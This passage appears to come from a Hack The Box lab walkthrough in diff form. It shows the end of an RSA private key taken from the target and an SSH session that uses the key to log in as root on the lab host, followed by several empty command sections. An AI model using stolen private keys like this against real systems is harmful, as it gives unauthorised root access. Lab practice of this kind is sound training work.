+k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH
+HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4
+dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI
+skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq
+tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a
+1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux
+RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf
+xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK
+Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1
+YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F
+AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3
+us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn
+1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV
+2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH
+bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3
+mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe
+2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4
+-----END RSA PRIVATE KEY-----
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+┌─[root@parrot-virtual]─[/home/user/htb/registry/restore/root/.ssh]
+└──╼ #ssh root@10.10.10.159 -i id_rsa 
+The authenticity of host '10.10.10.159 (10.10.10.159)' can't be established.
+ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.159' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+  System information as of Mon May 17 06:10:04 UTC 2021
+
+  System load:  0.0                Users logged in:                1
+  Usage of /:   25.0% of 13.53GB   IP address for eth0:            10.10.10.159
+  Memory usage: 17%                IP address for docker0:         172.17.0.1
+  Swap usage:   0%                 IP address for br-1bad9bd75d17: 172.18.0.1
+  Processes:    180
+Last login: Tue Apr  6 11:40:04 2021
+root@bolt:~# 
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
